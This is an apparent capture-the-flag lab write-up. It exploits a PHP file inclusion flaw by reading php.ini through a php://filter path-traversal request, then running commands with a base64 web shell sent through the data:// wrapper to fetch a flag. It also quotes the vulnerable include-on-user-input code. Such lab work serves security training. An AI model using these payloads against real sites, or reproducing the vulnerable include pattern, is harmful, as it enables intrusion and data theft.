## Challenge

Try to gain RCE using one of the PHP wrappers and read the flag at /

## Solution

The webpage had an option to change the page:

`http://94.237.54.42:44758/index.php?language=en.php`

With `Ffuf` I tried to fuzz and get any file of importance:

```sh
ffuf -v -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://94.237.54.42:44758/FUZZ.php
```

And there was only a `extension.php`, as seen below, and seeing how the parameter `language` is used, I know there is a `path traversal vulnerability`.

Extension.php:
```php
 <!DOCTYPE html>
<?php
error_reporting(E_ALL);
ini_set('display_errors', 'On');
if(isset($_GET['language'])) {
  $lang = $_GET['language'];
}
else {
  $lang = "en.php";
}
?>
<html lang="en" >
<head>
  <meta charset="UTF-8">
  <title>Inlane Freight</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,700" rel="stylesheet">
  <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.4.0/css/font-awesome.min.css'><link rel="stylesheet" href="./style.css">
</head>

<body>
<div class="navbar">
  <a href="#home">Inlane Freight</a>
  <div class="dropdown">
    <button class="dropbtn">Language 
      <i class="fa fa-caret-down"></i>
    </button>
    <div class="dropdown-content">
      <a href="index.php?language=en.php">English</a>
      <a href="index.php?language=es.php">Spanish</a>
    </div>
  </div> 
</div>
<!-- partial:index.partial.html -->
<div class="blog-card">
    <div class="meta">
      <div class="photo" style="background-image: url(./image.jpg)"></div>
      <ul class="details">
        <li class="author"><a href="#">John Doe</a></li>
        <li class="date">Aug. 24, 2019</li>
      </ul>
    </div>
    <div class="description">
      <h1>History</h1>
      <h2>Containers</h2>
      <?php
        include($lang . ".php");
        echo $p2;
      ?>
      <p class="read-more">
        <a href="#">Read More</a>
      </p>
    </div>
  </div>
  <div class="blog-card alt">
    <div class="meta">
      <div class="photo" style="background-image: url(./image.jpg)"></div>
      <ul class="details">
        <li class="author"><a href="#">Jane Doe</a></li>
        <li class="date">July. 15, 2019</li>
      </ul>
    </div>
    <div class="description">
      <h1>Container Industry</h1>
      <h2>Opening a door to the future</h2>
      <p>Lorem ipsum dolor sit amet, consectetur adipisicing elit. Ad eum dolorum architecto obcaecati enim dicta praesentium, quam nobis! Neque ad aliquam facilis numquam. Veritatis, sit.</p>
      <p class="read-more">
        <a href="#">Read More</a>
      </p>
    </div>
  </div>
<!-- partial -->
</body>
</html>
 ```
Now, by using that I try to read the `php.ini` file, but first I need to encode it, and I use the `php filter` for that:

`http://94.237.54.42:44758/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../../etc/php/7.4/apache2/php.ini`

There I gained a base64 encoded string which I decoded using Burp and saved it into a file `php.ini`.

I used `grep` to see if the `allow_url_include` set.

```sh
cat php.ini | grep allow_url_include
allow_url_include = On
```

So, now I now that it is vulnerable to for example `data` wrapper as explained in the `knowledge base`.

I encode the simple shell to base64:

```sh
echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

Then I url-encode it and put in the url, by executing the `whoami` command:

`94.237.54.42:44758/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg%3d%3d&cmd=whoami`

and the result is: `www-data`.

So let's check the list of files and directories on the root directory:

`http://94.237.54.42:44758/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg%3d%3d&cmd=ls%20/`

This brings:

```
           37809e2f8952f06139011994726d9ef1.txt
bin
boot
dev
etc
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

And now I will readh the text file with:

`http://94.237.54.42:44758/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2bCg%3d%3d&cmd=cat%20/37809e2f8952f06139011994726d9ef1.txt`

The result is the flag:

`HTB{d!$46l3_r3m0t3_url_!nclud3}`

